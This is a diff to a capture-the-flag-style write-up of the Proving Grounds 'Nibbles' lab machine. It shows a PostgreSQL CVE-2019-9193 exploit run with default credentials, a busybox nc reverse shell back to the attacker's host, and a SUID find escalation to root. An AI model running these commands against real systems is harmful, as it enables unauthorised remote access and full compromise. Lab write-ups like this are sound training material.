@@ -1,6 +1,6 @@
 ---
 title: "PG Practice - Nibbles"
-date: 2026-06-23
+date: 2026-06-21
 draft: false
 tags: ["Proving Grounds Practice", "Linux", "Write-Up"]
 cover:
@@ -51,6 +51,29 @@ postgres:postgres
 
 ![](/images/writeup_screens/pg_nibbles/pg_nibbles1.png)
 
+I found out that the version **11.7** is vulnerable to CVE-2019-9193 which is an authenticated RCE for which i found this [public exploit](https://github.com/b4keSn4ke/CVE-2019-9193)
+
+![](/images/writeup_screens/pg_nibbles/pg_nibbles2.png)
+
+I used the following command to receive a reverse shell as user **postgres** on the target:
+
+```
+└─$ python3 cve-2019-9193.py -i 192.168.120.47 -p 5437 -U postgres -P postgres -c 'busybox nc 192.168.45.198 80 -e /bin/bash' 
+```
+
+We have read privileges on the home directory of wilson so we can read _/home/wilson/local.txt_
+
 
 ## Proof.txt
 
+By analysing the output of `$ find / -perm -u=s -type f 2>/dev/null` we can see that the SUID bit for _/usr/bin/find_ is set: 
+
+![](/images/writeup_screens/pg_nibbles/pg_nibbles3.png)
+
+If we search for this binary in [GTFOBins](https://gtfobins.org/gtfobins/find/) we can find the following command for escalating to a root shell when SUID is set: 
+
+```
+$ find . -exec /bin/sh -p \; -quit
+```
+
+It worked and I was able to read _/root/proof.txt_
